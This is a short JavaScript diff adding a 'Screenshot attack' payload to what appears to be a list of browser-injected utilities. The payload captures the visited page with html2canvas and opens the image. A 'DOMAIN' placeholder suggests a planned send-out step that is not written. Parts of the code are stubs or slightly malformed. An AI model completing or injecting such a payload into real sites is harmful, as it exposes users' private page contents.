@@ -95,6 +95,37 @@ const utils = [
       })
 
     }
+  },
+
+
+  
+  {
+    name: "Screenshot attack",
+    description: "Download screenshot of the current page they visited",
+    func: () => {
+      document.addEventListener('DOMContentLoaded', function () {
+        // your code here
+      }, false);
+
+      html2canvas(document.body, {
+        allowTaint: true,
+        useCORS: true,
+      })
+        .then(async function (canvas) {
+          // It will return a canvas element
+          // DOMAIN
+        var image = new Image();
+        image.src = canvas.toDataURL("image/png")
+        image.style.width = "100vw;"
+
+        var w = window.open("");
+        w.document.write(image.outerHTML);
+        })
+        .catch((e) => {
+          // Handle errors
+          console.log(e);
+        });
+    }
   }
 ]
 
